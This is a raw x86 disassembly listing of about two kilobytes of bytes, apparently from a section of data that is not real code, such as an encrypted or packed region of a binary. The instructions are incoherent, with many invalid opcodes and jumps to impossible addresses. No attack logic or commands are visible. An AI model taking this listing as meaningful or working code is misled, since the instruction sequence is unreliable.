  403005:	sub    al,0x84
  403007:	cdq    
  403008:	in     eax,0x24
  40300a:	mov    ds:0x2706ce70,al
  40300f:	pop    edx
  403010:	and    BYTE PTR [edx],dh
  403012:	xchg   esp,eax
  403013:	cwde   
  403014:	xor    BYTE PTR [ebx+0x21],bh
  403017:	dec    ebx
  403018:	push   ecx
  403019:	add    eax,DWORD PTR [ecx+ebx*1]
  40301c:	dec    eax
  40301d:	pop    ebp
  40301e:	ret    0x9e35
  403021:	mov    BYTE PTR [eax],ah
  403023:	shl    BYTE PTR [esi],1
  403025:	dec    ebx
  403026:	out    dx,al
  403027:	add    al,0x14
  403029:	inc    edx
  40302a:	mov    esp,0x6412b001
  40302f:	jbe    0x402ff0
  403031:	outs   dx,BYTE PTR ds:[esi]
  403032:	int    0x9e
  403034:	loop   0x403094
  403036:	add    DWORD PTR [ecx],edi
  403038:	cwde   
  403039:	add    bh,BYTE PTR [edx+edi*2+0x1c670f60]
  403040:	jb     0x40307e
  403042:	xchg   ebx,eax
  403043:	ins    BYTE PTR es:[edi],dx
  403044:	mov    ebp,0x84a40377
  403049:	gs mov eax,0xe1f4276e
  40304f:	lea    eax,[edi-0xc]
  403052:	sbb    DWORD PTR [ecx-0x6f56b2d8],edx
  403058:	adc    ah,BYTE PTR [esi]
  40305a:	cmc    
  40305b:	aam    0xcb
  40305d:	(bad)  
  40305e:	jno    0x403021
  403060:	retf   
  403061:	xor    dl,cl
  403063:	push   ebx
  403064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403065:	fs js  0x4030d7
  403068:	sbb    eax,ebp
  40306a:	xor    bl,BYTE PTR [ecx]
  40306c:	push   edi
  40306d:	aaa    
  40306e:	sub    DWORD PTR [ecx],esp
  403070:	jbe    0x4030d5
  403072:	leave  
  403073:	xor    dh,dl
  403075:	leave  
  403076:	pusha  
  403077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403078:	adc    cl,0x58
  40307b:	outs   dx,BYTE PTR ds:[esi]
  40307c:	sub    dl,dl
  40307e:	arpl   WORD PTR [esi-0x6ec56c23],dx
  403084:	out    0xb4,al
  403086:	sub    edx,eax
  403088:	aad    0x14
  40308a:	add    ecx,esi
  40308c:	or     DWORD PTR [esi-0x27bd6ea0],ecx
  403092:	dec    esp
  403093:	jle    0x4030eb
  403095:	daa    
  403096:	retf   
  403097:	pop    eax
  403098:	retf   0x75f0
  40309b:	sahf   
  40309c:	push   esi
  40309d:	sub    edi,edi
  40309f:	adc    eax,0x8042c1e7
  4030a4:	mov    esi,0xe6727fa8
  4030a9:	mov    edi,0x56cf8d13
  4030ae:	mov    bl,0x5b
  4030b0:	std    
  4030b1:	xchg   ebp,eax
  4030b2:	iret   
  4030b3:	ja     0x40303d
  4030b5:	push   esp
  4030b6:	test   DWORD PTR [edi-0x21],edx
  4030b9:	jbe    0x40311e
  4030bb:	push   es
  4030bc:	scas   al,BYTE PTR es:[edi]
  4030bd:	pop    edx
  4030be:	lock ret 0x5cd5
  4030c2:	add    BYTE PTR [ebp-0x52331451],bl
  4030c8:	mov    edi,DWORD PTR [eax+0x1075d96a]
  4030ce:	or     bl,dl
  4030d0:	or     eax,DWORD PTR [ebp+0x1c703a4b]
  4030d6:	pushf  
  4030d7:	mov    eax,ds:0xef857022
  4030dc:	imul   edi,DWORD PTR [edi],0xc504b696
  4030e2:	or     al,0x17
  4030e5:	aas    
  4030e6:	push   ebp
  4030e7:	into   
  4030e8:	cmp    ecx,eax
  4030ea:	pop    ebx
  4030eb:	mov    WORD PTR [ebx+0x7026ef5],fs
  4030f1:	shl    al,1
  4030f3:	or     bl,0xa2
  4030f6:	cmp    dl,BYTE PTR [esi]
  4030f8:	jmp    0xd87ad76b
  4030fd:	(bad)  
  4030fe:	mov    eax,0xdc5f2723
  403103:	pop    edi
  403104:	ss test al,0x60
  403107:	pop    ebp
  403108:	lds    edx,FWORD PTR [edx+esi*1-0x26]
  40310c:	cld    
  40310d:	jge    0x4030da
  40310f:	retf   0x3a96
  403112:	adc    eax,DWORD PTR [eax-0x6a]
  403115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403116:	int    0x1e
  403118:	std    
  403119:	popa   
  40311a:	xor    DWORD PTR [eax+0x32],edi
  40311d:	xchg   ebx,eax
  40311e:	mov    bl,0xe8
  403120:	pop    eax
  403121:	repnz inc edx
  403123:	xor    bl,ch
  403125:	into   
  403126:	rol    BYTE PTR [ecx],1
  403128:	push   ecx
  403129:	or     eax,0xb2b971b1
  40312e:	lds    esi,FWORD PTR [esi-0x76]
  403131:	das    
  403132:	or     ch,ah
  403134:	xor    eax,0x3acc118e
  403139:	push   edi
  40313a:	xor    cl,BYTE PTR [ebp-0x26]
  40313d:	jmp    0xa495e014
  403142:	sbb    ebp,DWORD PTR [esi]
  403144:	sti    
  403145:	or     ebp,DWORD PTR [eax-0x4c]
  403148:	jl     0x403115
  40314a:	stc    
  40314b:	mov    ds,WORD PTR [eax-0x2b]
  40314e:	ror    esi,cl
  403150:	inc    esp
  403151:	cli    
  403152:	mov    es,ebp
  403154:	in     eax,0x67
  403156:	mov    bh,0x1f
  403158:	sub    esi,DWORD PTR [esi-0x67]
  40315b:	jne    0x4030f4
  40315d:	xchg   ecx,eax
  40315e:	mov    WORD PTR [esi],?
  403160:	mov    al,0x6
  403162:	out    0xc,al
  403164:	shl    BYTE PTR [ecx],cl
  403166:	shr    esp,1
  403168:	xchg   ebx,eax
  403169:	mov    ch,0xe1
  40316b:	adc    esi,DWORD PTR [ecx+0x64]
  40316e:	jns    0x403182
  403170:	hlt    
  403171:	jmp    0x83ac:0xa0efa0f2
  403178:	add    eax,0xa8fa3d74
  40317d:	out    0x47,eax
  40317f:	sub    ah,BYTE PTR [ecx+0x49]
  403182:	push   edi
  403183:	ins    DWORD PTR es:[edi],dx
  403184:	dec    eax
  403185:	in     eax,0x3c
  403187:	xchg   esi,eax
  403188:	cmp    BYTE PTR [esp+eiz*4-0x38],dl
  40318c:	push   edi
  40318d:	dec    ebp
  40318e:	fiadd  DWORD PTR [eax+0x3922b130]
  403194:	(bad)  
  403195:	mov    al,ds:0xacb872fe
  40319a:	ds ret 
  40319c:	cli    
  40319d:	add    al,0x78
  40319f:	mov    al,ds:0x857b6dc9
  4031a4:	push   ebp
  4031a5:	pop    ecx
  4031a6:	pop    eax
  4031a7:	adc    eax,DWORD PTR [ebx+0x49592964]
  4031ad:	into   
  4031ae:	adc    DWORD PTR [edx],ebx
  4031b0:	cmp    BYTE PTR [ebp-0x7a],ch
  4031b3:	nop
  4031b4:	out    0x4c,al
  4031b6:	fwait
  4031b7:	push   esp
  4031b8:	leave  
  4031b9:	ror    ch,cl
  4031bb:	jmp    0x403229
  4031bd:	sbb    ebx,ebp
  4031bf:	xor    al,0x95
  4031c1:	mov    dh,0xf4
  4031c3:	jno    0x4031c8
  4031c5:	aaa    
  4031c6:	xchg   ecx,eax
  4031c7:	pop    ds
  4031c8:	sbb    DWORD PTR [edx+0x73],eax
  4031cb:	jmp    0x3edc:0xed98a472
  4031d2:	rol    BYTE PTR [ebp-0x18],0xcc
  4031d6:	cmc    
  4031d7:	pop    ss
  4031d8:	outs   dx,DWORD PTR ds:[esi]
  4031d9:	jbe    0x40316b
  4031db:	js     0x403165
  4031dd:	sbb    esi,DWORD PTR [ebx+0x6d38f25c]
  4031e3:	inc    ebx
  4031e4:	sahf   
  4031e5:	fiadd  WORD PTR [edx]
  4031e7:	std    
  4031e8:	cs cld 
  4031ea:	pop    ebx
  4031eb:	push   0x34
  4031ed:	mov    ch,0xb6
  4031ef:	lods   eax,DWORD PTR ds:[esi]
  4031f0:	pop    ebx
  4031f1:	pop    ebp
  4031f2:	xor    eax,DWORD PTR [edi+0x38]
  4031f5:	cmp    eax,0x403505cb
  4031fa:	retf   0x604e
  4031fd:	adc    BYTE PTR [ecx+0x78a463e7],0xa4
  403204:	adc    DWORD PTR [eax+0x48],0x5c
  403208:	or     al,0x38
  40320a:	or     eax,0x37c55518
  40320f:	test   BYTE PTR [ebx+0x1c],0x96
  403213:	scas   al,BYTE PTR es:[edi]
  403214:	push   cs
  403215:	mov    esi,0x3e81cdb1
  40321a:	arpl   si,bx
  40321c:	push   eax
  40321d:	ins    DWORD PTR es:[edi],dx
  40321e:	add    al,0xf
  403220:	outs   dx,DWORD PTR ds:[esi]
  403221:	add    esp,DWORD PTR [edi+edi*1]
  403224:	jbe    0x403295
  403226:	xor    eax,0x734768
  40322b:	sbb    eax,0xa70b2e71
  403230:	jo     0x4031d0
  403232:	add    dh,bh
  403234:	repz aam 0x4f
  403237:	jmp    FWORD PTR [edx-0x6b8bde1c]
  40323d:	xchg   ebx,eax
  40323e:	rcl    BYTE PTR [edx+0x25],cl
  403241:	add    BYTE PTR [eax+0x31844277],ch
  403247:	xchg   edx,eax
  403248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40324a:	adc    eax,0x47757dfb
  40324f:	sar    DWORD PTR [ebx],cl
  403251:	cmp    DWORD PTR [ebx+0x1],edi
  403254:	addr16 retf 
  403256:	mov    dl,0x9b
  403258:	jae    0x403231
  40325a:	push   cs
  40325b:	push   ds
  40325c:	cmc    
  40325d:	aad    0x9e
  40325f:	add    DWORD PTR [edi+0x55],ecx
  403262:	fnop   
  403264:	mov    edx,0x4b833c4c
  403269:	or     BYTE PTR [ecx],0x57
  40326c:	ret    
  40326d:	jb     0x4032ac
  40326f:	push   ss
  403270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403271:	cmp    al,0xa4
  403273:	hlt    
  403274:	scas   al,BYTE PTR es:[edi]
  403275:	push   esp
  403276:	scas   al,BYTE PTR es:[edi]
  403277:	mov    ebp,0x614fbaf5
  40327c:	push   0xce66b352
  403281:	add    ebx,DWORD PTR [ebx-0x5b]
  403284:	das    
  403285:	jle    0x4032b9
  403287:	adc    eax,0xb6aa29ff
  40328c:	xor    BYTE PTR [edx+0x32],ch
  40328f:	ss jno 0x403222
  403292:	loope  0x4032d2
  403294:	pop    esi
  403295:	(bad)  
  403296:	sbb    al,0xe1
  403298:	push   0xfffffff3
  40329a:	ins    BYTE PTR es:[edi],dx
  40329b:	call   0x7b711c09
  4032a0:	jno    0x403299
  4032a2:	dec    edx
  4032a3:	jno    0x4032db
  4032a5:	imul   ebx,DWORD PTR [ebx],0x3a
  4032a8:	push   0xfffffffd
  4032aa:	sbb    bh,BYTE PTR [eax+ebx*1-0x12dad07c]
  4032b1:	stos   BYTE PTR es:[edi],al
  4032b2:	sbb    DWORD PTR [eax+edx*4-0x5b],ecx
  4032b6:	push   ebp
  4032b7:	mov    dl,0x58
  4032b9:	cmp    BYTE PTR [ecx],dl
  4032bb:	push   ss
  4032bc:	pop    esi
  4032bd:	dec    esi
  4032be:	or     BYTE PTR [eax+0x77],0x1b
  4032c2:	rcr    bh,0x87
  4032c5:	or     dl,BYTE PTR [edx]
  4032c7:	repnz xchg ebx,eax
  4032c9:	pop    ss
  4032ca:	pop    edx
  4032cb:	cmp    al,0x68
  4032cd:	or     ebx,eax
  4032cf:	xor    BYTE PTR [ecx+0x6a15e840],dh
  4032d5:	cmc    
  4032d6:	adc    bh,BYTE PTR [ecx]
  4032d8:	sbb    BYTE PTR [eax-0x2e8178d0],bl
  4032de:	mov    bh,BYTE PTR [eax-0xa]
  4032e1:	enter  0x9054,0x10
  4032e5:	pop    ds
  4032e6:	add    BYTE PTR [esi+0x3d],dl
  4032e9:	(bad)
  4032ec:	jbe    0x4032ce
  4032ee:	jg     0x403297
  4032f0:	imul   ecx,DWORD PTR [edi+0x30],0xc61a2c93
  4032f7:	cmc    
  4032f8:	fs test al,0x24
  4032fb:	int3   
  4032fc:	sbb    al,0xea
  4032fe:	adc    al,0xa3
  403300:	mov    ebp,DWORD PTR [ecx-0x50]
  403303:	cmp    BYTE PTR [ebx+0xcc2ca19],dh
  403309:	cwde   
  40330a:	sahf   
  40330b:	fadd   QWORD PTR [edi-0x303e97fe]
  403311:	shl    bl,cl
  403313:	dec    ebp
  403314:	mov    ebp,0xdaddb87e
  403319:	add    al,0xb4
  40331b:	adc    bl,BYTE PTR [ebx-0x32]
  40331e:	or     eax,ebx
  403320:	xchg   ebx,eax
  403321:	jp     0x40331b
  403323:	or     DWORD PTR [edx-0x901cc92],eax
  403329:	pop    eax
  40332a:	xchg   ebp,eax
  40332b:	cwde   
  40332c:	push   ds
  40332d:	xor    al,0xff
  40332f:	cld    
  403330:	cmp    esi,DWORD PTR [edi+0x2e]
  403333:	popa   
  403334:	(bad)  
  403335:	mov    eax,DWORD PTR [edi-0x2af385f2]
  40333b:	fsub   QWORD PTR [edx]
  40333d:	pop    ecx
  40333e:	call   0xc6f54a2c
  403343:	mov    ecx,0xe59fe91b
  403348:	mov    al,ds:0xf638ec84
  40334d:	cmp    ah,bh
  40334f:	xor    ecx,DWORD PTR [eax+0x452e0d81]
  403355:	rcl    DWORD PTR [ecx-0x5f],cl
  403358:	fnstcw WORD PTR es:[ecx]
  40335b:	fidivr WORD PTR [eax+0x40]
  40335e:	rcl    BYTE PTR fs:[edx],cl
  403361:	add    BYTE PTR [ecx],0x33
  403364:	test   bh,ah
  403366:	outs   dx,DWORD PTR ds:[esi]
  403367:	push   ebp
  403368:	outs   dx,BYTE PTR ds:[esi]
  403369:	push   eax
  40336a:	mov    al,0x73
  40336c:	pop    eax
  40336d:	ja     0x40336d
  40336f:	add    eax,0xadba7be9
  403374:	nop
  403375:	mov    al,ds:0x72a7b888
  40337a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40337c:	mov    dl,BYTE PTR [edx-0x27e1507d]
  403382:	out    dx,al
  403383:	inc    edx
  403384:	pop    edi
  403385:	jae    0x403312
  403387:	ja     0x4033fe
  403389:	inc    edi
  40338a:	xchg   ebp,eax
  40338b:	mov    ah,0x9d
  40338d:	add    dl,BYTE PTR [ebp-0x63]
  403390:	xchg   BYTE PTR [esi],bl
  403392:	sbb    ch,dh
  403394:	inc    ecx
  403395:	dec    esi
  403396:	push   edi
  403397:	outs   dx,DWORD PTR ds:[esi]
  403398:	xor    eax,0x7290e83e
  40339d:	mov    eax,ds:0xa28dbe8f
  4033a2:	jne    0x4033e0
  4033a4:	stc    
  4033a5:	jmp    esp
  4033a7:	cs jge 0x4033fb
  4033aa:	mov    edx,0xf95a8e9c
  4033af:	dec    edx
  4033b0:	inc    ecx
  4033b1:	pushf  
  4033b2:	fldcw  WORD PTR [edi+0x10]
  4033b5:	stos   BYTE PTR es:[edi],al
  4033b6:	aas    
  4033b7:	fwait
  4033b8:	cs dec esp
  4033ba:	retf   
  4033bb:	rcr    DWORD PTR [ebx-0x4403955b],cl
  4033c1:	fidivr DWORD PTR [ebp+0x2b]
  4033c4:	loopne 0x403372
  4033c6:	add    bh,BYTE PTR [edi+0x1f]
  4033c9:	add    cl,dl
  4033cb:	fild   DWORD PTR [esi+0x236c40d7]
  4033d1:	mov    cs,WORD PTR [esi]
  4033d3:	adc    ah,cl
  4033d5:	jbe    0x403426
  4033d7:	sbb    al,0xb2
  4033d9:	in     al,dx
  4033da:	xchg   bl,bh
  4033dc:	inc    esp
  4033dd:	pop    edx
  4033de:	leave  
  4033df:	or     eax,0x157baa07
  4033e4:	outs   dx,DWORD PTR ds:[esi]
  4033e5:	pop    es
  4033e6:	fbstp  TBYTE PTR [ecx+ebp*4-0x3fe43d0c]
  4033ed:	add    al,BYTE PTR [esi]
  4033ef:	les    ecx,FWORD PTR [eax+0x54]
  4033f2:	int    0x3e
  4033f4:	ins    DWORD PTR es:[edi],dx
  4033f5:	cmp    DWORD PTR [edi+0x49],ebp
  4033f8:	ror    ebp,1
  4033fa:	dec    eax
  4033fb:	cpuid  
  4033fd:	push   ss
  4033fe:	mov    ebx,0x4500c106
  403403:	jle    0x4033cb
  403405:	jp     0x40346a
  403407:	sub    DWORD PTR [ebp+0x283accbc],ebp
  40340d:	jmp    0x403457
  40340f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403411:	stc    
  403412:	lds    esp,FWORD PTR [ecx-0x2e]
  403415:	cmp    ebx,DWORD PTR [esi]
  403417:	push   ds
  403418:	dec    ecx
  403419:	retf   0x6e92
  40341c:	and    esp,DWORD PTR [edi]
  40341e:	(bad)  
  40341f:	in     eax,0xb9
  403421:	or     al,0x9b
  403423:	or     BYTE PTR [edi-0x27224afb],ah
  403429:	xor    eax,0x1bdd7530
  40342e:	je     0x4033ed
  403430:	push   es
  403431:	sbb    DWORD PTR [ebx-0x64],eax
  403434:	sub    ebp,DWORD PTR [esi-0x34]
  403437:	dec    esp
  403438:	icebp  
  403439:	sti    
  40343a:	es dec edi
  40343c:	lods   al,BYTE PTR ds:[esi]
  40343d:	(bad)  
  40343e:	(bad)  [edx]
  403440:	(bad)  
  403441:	retf   0xb2e
  403444:	(bad)  
  403445:	fisubr DWORD PTR [edx]
  403447:	pop    edi
  403448:	push   ebp
  403449:	dec    ebp
  40344a:	rol    BYTE PTR [eax-0x43800163],1
  403450:	ret    
  403451:	repz in eax,dx
  403453:	pop    eax
  403454:	jb     0x403460
  403456:	fld    QWORD PTR [ebx+eiz*8-0x55b6de94]
  40345d:	add    ch,BYTE PTR [edi]
  40345f:	lea    edx,[esi-0xae88ff6]
  403465:	shl    BYTE PTR [edx],1
  403467:	cdq    
  403468:	(bad)
  40346c:	mov    edi,0x1d12f12a
  403471:	mov    bh,0x5c
  403473:	jbe    0x403464
  403475:	or     ax,0xeb94
  403479:	cwde   
  40347a:	sub    DWORD PTR [esp+edi*2-0x30f2bdf7],ebx
  403481:	imul   edx,DWORD PTR ds:[edx-0x6c],0x2b
  403486:	push   ebx
  403487:	inc    ebx
  403488:	fidivr WORD PTR [ecx-0xd]
  40348b:	mov    cl,0x42
  40348d:	mov    cl,0x26
  40348f:	xchg   DWORD PTR [eax-0x2223c4f7],esi
  403495:	xor    ecx,edi
  403497:	fisub  DWORD PTR ds:0x98ae6607
  40349d:	inc    eax
  40349e:	loope  0x403454
  4034a0:	and    al,0x95
  4034a2:	into   
  4034a3:	sbb    eax,0xfc36600b
  4034a8:	and    DWORD PTR [edi-0x5],0xf5595867
  4034af:	imul   esp,DWORD PTR [edi+0x2f],0x4c
  4034b3:	jae    0x4034a0
  4034b5:	cmp    DWORD PTR [edi],0x62a143ea
  4034bb:	push   eax
  4034bc:	iret   
  4034bd:	in     eax,dx
  4034be:	lea    esp,[eax]
  4034c0:	adc    eax,0x19bfa461
  4034c5:	add    eax,0x4594521e
  4034ca:	pop    ebp
  4034cb:	cld    
  4034cc:	(bad)  
  4034cd:	popf   
  4034ce:	mov    dl,0x12
  4034d0:	jp     0x4034ba
  4034d2:	jnp    0x40346d
  4034d4:	and    ch,BYTE PTR [eax+0x5fadf118]
  4034da:	bound  ecx,QWORD PTR [esi+0x6c97f3c3]
  4034e0:	aam    0x3f
  4034e2:	int3   
  4034e3:	and    DWORD PTR [eax+eiz*8+0x476ead6d],ecx
  4034ea:	sti    
  4034eb:	mov    esp,0x38d14bf2
  4034f0:	jbe    0x403569
  4034f2:	mov    dl,0x27
  4034f4:	cmp    bh,al
  4034f6:	or     ebp,DWORD PTR [edx-0x7d]
  4034f9:	in     al,0xfc
  4034fb:	add    al,0x4c
  4034fd:	inc    ebx
  4034fe:	ficomp DWORD PTR [edx+0x18]
  403501:	mov    ebx,0xe05c36b8
  403506:	cmp    DWORD PTR [ebx+edi*1],edx
  403509:	cmp    DWORD PTR [ebx-0x1dd4a9e6],ebp
  40350f:	fimul  WORD PTR [ebx-0x2b]
  403512:	rcl    DWORD PTR [esi],1
  403514:	mov    eax,0x77137c57
  403519:	ja     0x4034c4
  40351b:	cmp    bl,BYTE PTR [ecx-0x75688390]
  403521:	dec    esp
  403522:	mov    BYTE PTR [ecx-0x61a67ec9],cl
  403528:	push   ebp
  403529:	ret    0x41e3
  40352c:	fsub   DWORD PTR es:[eax-0x57]
  403530:	(bad)
  403533:	(bad)  [esi]
  403535:	mov    ah,dh
  403537:	ds pushf 
  403539:	pop    edi
  40353a:	retf   0xdc94
  40353d:	pushf  
  40353e:	sbb    DWORD PTR [edx+esi*4],edi
  403541:	mov    ebp,0x890a5978
  403546:	sahf   
  403547:	pushf  
  403548:	dec    ebp
  403549:	call   0xb0342eef
  40354e:	ds push 0xe4a60b7
  403554:	cmp    esp,edx
  403556:	mov    ebx,0xc47d9697
  40355b:	pop    esi
  40355c:	cwde   
  40355d:	sub    DWORD PTR [ebx-0x4d],0x44babc99
  403564:	or     eax,0x3d218174
  403569:	inc    edi
  40356a:	pop    ebp
  40356b:	inc    esp
  40356c:	das    
  40356d:	sbb    eax,0x77918813
  403572:	adc    ebx,esp
  403574:	xor    BYTE PTR [edi-0x35],ah
  403577:	push   ecx
  403578:	sub    al,0x3c
  40357a:	test   al,0xc
  40357c:	ficomp WORD PTR [edi+0x6eeddf87]
  403582:	das    
  403583:	lock push 0x2f559849
  403589:	adc    al,0xde
  40358b:	mov    ch,BYTE PTR [ebx+0x6]
  40358e:	rol    BYTE PTR [edi],0x24
  403591:	pop    esp
  403592:	jg     0x40359e
  403594:	rol    ch,cl
  403596:	jae    0x40358a
  403598:	or     BYTE PTR [ebp+0x78],cl
  40359b:	iret   
  40359c:	xchg   ebp,eax
  40359d:	test   BYTE PTR [ecx-0x7e],dl
  4035a0:	aad    0x72
  4035a2:	add    DWORD PTR [edi+0xb242992],ebp
  4035a8:	ret    0x3eeb
  4035ab:	dec    ebx
  4035ac:	inc    ecx
  4035ad:	jno    0x4035b2
  4035af:	add    eax,0x3e14108
  4035b4:	sub    eax,0x32e7d595
  4035b9:	inc    edx
  4035ba:	ror    eax,cl
  4035bc:	pop    es
  4035bd:	aam    0x26
  4035bf:	fwait
  4035c0:	pop    edx
  4035c1:	xchg   edi,eax
  4035c2:	jle    0x403554
  4035c4:	stc    
  4035c5:	mov    edi,0xdda59460
  4035ca:	adc    bh,BYTE PTR ds:0xa5556594
  4035d0:	cmp    eax,0x475e62c0
  4035d5:	xchg   BYTE PTR [ecx-0x10],dh
  4035d8:	mov    esi,DWORD PTR [edx*4-0x2357d389]
  4035df:	syscall 
  4035e1:	outs   dx,DWORD PTR ds:[esi]
  4035e2:	push   ds
  4035e3:	cmp    BYTE PTR [esi],bl
  4035e5:	je     0x403611
  4035e7:	and    al,0x83
  4035e9:	imul   edi,DWORD PTR [ebx],0x52536b21
  4035ef:	sbb    eax,edx
  4035f1:	rol    DWORD PTR [esi+0x4b54c44d],0x2b
  4035f8:	pop    ebp
  4035f9:	push   0x41
  4035fb:	mov    ds:0xe53f7759,eax
  403600:	sbb    BYTE PTR [edi],ch
  403602:	jl     0x403681
  403604:	(bad)  
  403605:	imul   esp,esp,0xf32c4aef
  40360b:	or     al,0xb9
  40360d:	add    al,0x4b
  40360f:	jo     0x403662
  403611:	in     al,0x86
  403613:	cmp    dh,BYTE PTR [ebp-0x1b]
  403616:	mov    esi,0x6900a0a7
  40361b:	cld    
  40361c:	inc    esi
  40361d:	test   eax,0x620e54ce
  403622:	fldenv [edi+ecx*4-0xbc51bd8]
  403629:	sti    
  40362a:	popa   
  40362b:	jns    0x4035d0
  40362d:	dec    edx
  40362e:	test   DWORD PTR [eax],ebx
  403630:	or     ebp,DWORD PTR [eax+0x3b37d8ac]
  403636:	outs   dx,DWORD PTR ds:[esi]
  403637:	jbe    0x4036b2
  403639:	adc    BYTE PTR [ebp+0x57],bl
  40363c:	sbb    eax,0xffffff81
  40363f:	mov    dh,0xaa
  403641:	out    dx,eax
  403642:	aas    
  403643:	into   
  403644:	aas    
  403645:	cli    
  403646:	hlt    
  403647:	inc    esi
  403649:	cmp    eax,0xa46bd066
  40364e:	out    dx,eax
  40364f:	cs cwde 
  403651:	xchg   BYTE PTR [eax],dh
  403653:	fisubr DWORD PTR [ebx-0x652c743e]
  403659:	lahf   
  40365a:	out    dx,eax
  40365b:	inc    edi
  40365c:	fdivr  st,st(0)
  40365e:	mov    esi,0x372b6a34
  403663:	scas   al,BYTE PTR es:[edi]
  403664:	pop    es
  403665:	mov    BYTE PTR [edi],bh
  403667:	jb     0x4035fb
  403669:	jbe    0x403688
  40366b:	out    dx,al
  40366c:	xor    al,0x8c
  40366e:	pop    ds
  40366f:	(bad)  
  403671:	mov    ebx,0x7a8a7d3a
  403676:	push   ds
  403677:	or     BYTE PTR [ebp+0x21df43d4],al
  40367d:	push   edx
  40367e:	xor    DWORD PTR es:[esi+0x2e],edi
  403682:	mov    ebp,0x54f09823
  403687:	cdq    
  403688:	outs   dx,DWORD PTR ds:[esi]
  403689:	scas   al,BYTE PTR es:[edi]
  40368a:	clc    
  40368b:	push   ebp
  40368c:	dec    edi
  40368d:	mov    bh,0x3b
  40368f:	jnp    0x403655
  403691:	add    cl,al
  403693:	xor    DWORD PTR [edi+0x2c],ebp
  403696:	rcl    bh,1
  403698:	imul   BYTE PTR [ecx-0x36]
  40369b:	repnz xchg ebx,eax
  40369d:	pop    ds
  40369e:	int3   
  40369f:	repz push ss
  4036a1:	sti    
  4036a2:	xlat   BYTE PTR ds:[ebx]
  4036a3:	jbe    0x40366a
  4036a5:	push   ds
  4036a6:	repz shr DWORD PTR [edx+0xbd149c0],0x2b
  4036ae:	les    ecx,FWORD PTR [edx+0x4af3cfce]
  4036b4:	sbb    DWORD PTR [ecx-0x561dbeb1],0xffffffa1
  4036bb:	pop    esp
  4036bc:	jp     0x4036d9
  4036be:	cdq    
  4036bf:	adc    BYTE PTR [eax],0x2e
  4036c2:	fdiv   QWORD PTR [eax+0x46]
  4036c5:	mov    al,ds:0x54085511
  4036ca:	dec    esp
  4036cb:	daa    
  4036cc:	xor    esp,DWORD PTR [ebp+0xce98750]
  4036d2:	sub    DWORD PTR [edx+eiz*4+0x2bdfc26],ecx
  4036d9:	sub    bl,BYTE PTR [edx+0x4d]
  4036dc:	mov    cl,0x52
  4036de:	or     DWORD PTR [esp+eax*8-0x6a9597d5],0x503b9e72
  4036e9:	call   0x1bc24494
  4036ee:	in     eax,0x6b
  4036f0:	mov    edx,gs
  4036f2:	imul   ebp,DWORD PTR [ecx],0xffffffef
  4036f5:	inc    eax
  4036f6:	out    0x88,al
  4036f8:	std    
  4036f9:	retf   
  4036fa:	sbb    esp,DWORD PTR [esi]
  4036fc:	test   DWORD PTR [ecx],edi
  4036fe:	in     eax,dx
  4036ff:	in     al,0x9a
  403701:	ror    ah,1
  403703:	aam    0x77
  403705:	into   
  403706:	push   esp
  403707:	rol    BYTE PTR [esi],1
  403709:	addr16 call 0xe5959dc5
  40370f:	sbb    DWORD PTR [ecx+0x62],esp
  403712:	mov    ds:0xa96e3e10,eax
  403717:	cmp    DWORD PTR [ebp-0x1e],0xd
  40371b:	adc    DWORD PTR [esi-0x78],0x38b718da
  403722:	lea    eax,fs:[edx+0x6d]
  403726:	test   eax,0xd159ad9f
  40372b:	mov    DWORD PTR [edx-0xf],edi
  40372e:	outs   dx,BYTE PTR ds:[esi]
  40372f:	int    0x9a
  403731:	add    edx,DWORD PTR [edx]
  403733:	sti    
  403734:	and    bl,BYTE PTR [ebp+0x33]
  403737:	push   edi
  403738:	aam    0x1f
  40373a:	xchg   ebp,ebx
  40373c:	cmp    eax,0xde038ff
  403741:	mov    bh,BYTE PTR [edx+0x5f3bf514]
  403747:	icebp  
  403748:	in     al,0x28
  40374a:	cmc    
  40374b:	mov    ds:0xa00867ea,al
  403750:	cmp    BYTE PTR es:[esi+0x5a],al
  403754:	jmp    DWORD PTR [edx-0x63b3aeea]
  40375a:	mov    bh,0xa0
  40375c:	(bad)  
  40375d:	shr    DWORD PTR [ebx+ebx*2],0xec
  403761:	adc    al,0xd9
  403763:	inc    ebp
  403764:	sbb    al,0x6c
  403766:	dec    ecx
  403767:	and    eax,0xbd38cbe9
  40376c:	cmc    
  40376d:	fstp   DWORD PTR [ebp+0x16]
  403770:	mov    DWORD PTR [ebp+edi*1-0x75],esp
  403774:	dec    ecx
  403775:	push   ebp
  403776:	xor    BYTE PTR [esi+0x4c0a3dc5],bh
  40377c:	xchg   ecx,eax
  40377d:	push   ss
  40377e:	rol    dl,0x57
  403781:	loopne 0x403757
  403783:	sub    ebp,DWORD PTR [edx]
  403785:	rol    DWORD PTR [eax+0x70dec29d],1
  40378b:	jecxz  0x403733
  40378d:	pop    ds
  40378e:	sbb    BYTE PTR [ecx-0x38],bl
  403791:	or     bh,BYTE PTR [eax+0x36f90c03]
  403797:	dec    ebp
  403798:	dec    esi
  403799:	loop   0x4037d2
  40379b:	int    0xb
  40379d:	inc    esp
  40379e:	int    0xe8
  4037a0:	and    ecx,edi
  4037a2:	jl     0x403741
  4037a4:	stos   BYTE PTR es:[edi],al
  4037a5:	cmp    ah,BYTE PTR [ebp+0x1f]
  4037a8:	mov    ds:0x6159b1ac,al
  4037ad:	xchg   DWORD PTR ss:[edi+0x3d207c28],eax
  4037b4:	std    
  4037b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037b6:	(bad)  
  4037b7:	test   al,0xb7
  4037b9:	out    dx,eax
  4037ba:	fld    TBYTE PTR [ecx+0x397d7b10]
  4037c0:	daa    
  4037c1:	mov    BYTE PTR [edi],dl
  4037c3:	push   es
  4037c4:	mov    ds:0xe872e952,eax
  4037c9:	mov    ss,WORD PTR [eax+0x7bfea5a2]
  4037cf:	inc    esp
  4037d0:	xchg   cl,al
  4037d2:	imul   esp,DWORD PTR [esi],0x34
  4037d5:	inc    ebp
  4037d6:	test   DWORD PTR [ecx],edi
  4037d8:	js     0x403788
